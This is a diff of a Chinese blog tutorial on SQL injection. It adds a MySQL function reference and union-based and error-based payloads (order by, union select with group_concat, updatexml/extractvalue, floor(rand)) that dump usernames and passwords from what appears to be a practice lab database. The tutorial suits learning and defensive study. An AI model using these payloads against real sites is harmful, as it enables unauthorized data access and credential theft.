@@ -75,20 +75,122 @@
 
       
       <h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
-<h2 id="0x01-操作过程与分析"><a href="#0x01-操作过程与分析" class="headerlink" title="0x01 操作过程与分析"></a>0x01 操作过程与分析</h2><ol>
-<li>使用order by  判断字段长度</li>
-<li>获取数据库名</li>
-<li>获取表名</li>
-<li>获取列名</li>
-<li>获取内容</li>
-</ol>
+<a id="more"></a>
 
+<h2 id="0x01-某些函数的使用方法"><a href="#0x01-某些函数的使用方法" class="headerlink" title="0x01 某些函数的使用方法"></a>0x01 某些函数的使用方法</h2><ol>
+<li><p>concat(str1,str2,str3,…),将多个字符串连接成一个字符串。</p>
+</li>
+<li><p>concat_ws(分隔符, str1, str2, …),添加了分割符（concat_ws就是concat with separator）</p>
+</li>
+<li><p>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )，将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
+</li>
+</ol>
+<p><a href="https://blog.csdn.net/Mary19920410/article/details/76545053" target="_blank" rel="noopener">参考文章</a></p>
+<ol start="4">
+<li><p>if(表达式1，表达式2，表达式3)，如果表达式1的值为真，执行表达式2，否则执行表达式3</p>
+</li>
+<li><p>substr(str,pos,len)/  mid(str,pos,len),从pos处开始截取，截取长度为len的字符</p>
+<ul>
+<li>MySQL: SUBSTR( ), SUBSTRING( )</li>
+<li>Oracle: SUBSTR( )</li>
+<li>SQL Server: SUBSTRING( ) </li>
+</ul>
+</li>
+<li><p>char()<strong>将十进制数转换成字符</strong>，在过滤掉单双引号的时使用较多；与其相反的是ascii()函数</p>
+</li>
+<li><p>sleep(n)，暂停数据库n秒</p>
+</li>
+<li><p>Length() 返回字符串的长度</p>
+</li>
+<li><p>database() 返回当前数据库名称</p>
+</li>
+<li><p>count(*) ,计数</p>
+</li>
+<li><p>floor(value)函数返回小于或等于指定值（value）的最小整数</p>
+</li>
+<li><p>ceiling(value)函数返回大于或等于指定值（value）的最小整数</p>
+</li>
+<li><p>rand()产生随机数介于0和1之间的一个数,rand(0)，则返回值都为<code>0.15522042769493574</code></p>
+</li>
+<li><p>查询xml函数<strong>extractvalue(目标xml文档，xml路径)</strong>与更新xml函数<strong>updatexml(目标xml文档，xml路径，更新的内容)</strong>  最大只能出32字符</p>
+</li>
+<li><p>reverse(str)翻转字符串</p>
+</li>
+<li><p>limit pos,len，   从pos开始查询，查询len条数据    </p>
+</li>
+</ol>
+<h2 id="0x02-操作过程与分析"><a href="#0x02-操作过程与分析" class="headerlink" title="0x02 操作过程与分析"></a>0x02 操作过程与分析</h2><h3 id="a-基本注入"><a href="#a-基本注入" class="headerlink" title="a. 基本注入"></a>a. 基本注入</h3><ol>
+<li><p>使用order/group by 判断字段长度</p>
+<p>users表中内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from users</span></span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure>
+
+<p><code>?id=%27 order by 3 %23</code></p>
+<p><code>?id=%27 order by 4 %23</code></p>
+<p><img src="/pic/28.png" alt=""></p>
+<p><img src="/pic/29.png" alt=""></p>
+<p>4报错，3没有报错，表示此表有三列。</p>
+<p><em>sql 控制台的执行结果</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id&#x3D;0 order by 4;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;order clause&#39;</span><br><span class="line">mysql&gt; select * from user where id&#x3D;0 order by 3;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>查看回显位置</p>
+<p><code>?id=%27 union select 1,2,3 %23</code></p>
+<p><img src="/pic/30.png" alt="">  2，3处有回显。</p>
+<p><em>sql控制台执行结果</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user where id&#x3D;0 union select 1,2,3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | 2        | 3        |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>因为sql控制台是所有都显示的，网页的界面的前端代码设置回显。</p>
+</li>
+<li><p>获取数据库名</p>
+<p><code>?id=%27 union select 1,database() ,3 %23</code></p>
+<p><img src="/pic/31.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id&#x3D;0 union select 1,database(),3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | security | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取表名</p>
+<p>在mysql的数据库中包含一个数据库，information_schema，其中的tables表中记录所有数据库的表名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名</p>
+<p><img src="/32.png" alt=""></p>
+<p><code>?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema=&#39;security&#39; %23</code></p>
+<p><img src="/33.png" alt=""></p>
+</li>
+<li><p>获取列名</p>
+<p>在information_schema中，columns表中记录所有数据库所有表的列名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名，column_name,记录的是列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME    | COLUMN_TYPE | COLUMN_KEY | EXTRA          | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION |</span><br><span class="line">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class="line">| def           | security     | users      | id          |                1 | NULL           | NO          | int       |                     NULL |                   NULL |                10 |             0 |               NULL | NULL               | NULL              | int(3)      | PRI        | auto_increment | select,insert,update,references |                |                       |</span><br><span class="line">| def           | security     | users      | username    |                2 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |</span><br><span class="line">| def           | security     | users      | password    |                3 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |</span><br><span class="line">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><code>?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema=&#39;security&#39; %23</code></p>
+<p><img src="/34.png" alt=""></p>
+</li>
+<li><p>获取内容</p>
+<p>获取users表的username和password</p>
+<p><code>?id=%27 union select 1,group_concat(username) ,group_concat(password)  from users %23</code></p>
+<p><img src="/35.png" alt=""></p>
+</li>
+</ol>
+<h3 id="b-报错注入"><a href="#b-报错注入" class="headerlink" title="b. 报错注入"></a>b. 报错注入</h3><ol>
+<li><p>查询数据库</p>
+<p><code>?id=0&#39; and updatexml(1,concat(1,(select database())),1)%23</code></p>
+<p>或者<code>?id=0&#39; and extractvalue(1,concat(1,(select database())))%23</code></p>
+<p><code>?id=0&#39; and (select 1 from (select count(*),concat((select database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code>(在测试时，这一条buu上无回显，但是本地是可以的，<strong>此条语句最多能显示64个字符，上面两条最多32个</strong>)</p>
+<p><img src="/36.png" alt=""></p>
+</li>
+<li><p>查询表名 <em>与基本注入相同不在重复</em></p>
+</li>
+<li><p>查询列名 <em>与基本注入相同不在重复</em></p>
+</li>
+<li><p>查信息</p>
+<p><code>?id=0&#39; and extractvalue(1,concat(1,(select substr(concat(username,&#39;~&#39;,password),1,30) from users limit 2,1 )))%23</code></p>
+<p>或者</p>
+<p><code>?id=0&#39; and updatexml(1,concat(1,(select substr(concat(username,&#39;~&#39;,password),1,30) from users limit 2,1 )),1)%23</code></p>
+<p>或者</p>
+<p><code>?id=0&#39; and (select 0 from (select count(*),concat((select concat(username,&#39;~&#39;,password) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
+<p>通过修改limit 一条一条查询</p>
+</li>
+</ol>
+<h3 id="c-输出文件注入"><a href="#c-输出文件注入" class="headerlink" title="c. 输出文件注入"></a>c. 输出文件注入</h3>
       
       <!-- 打赏 -->
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://sunny250.github.io/2020/01/05/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86/" data-id="ck59n7vi60001nw7e1d6z7evd"
+      <a data-url="https://sunny250.github.io/2020/01/05/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86/" data-id="ck6au71oq0008mw7ed45ccy1z"
         class="article-share-link">分享</a>
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
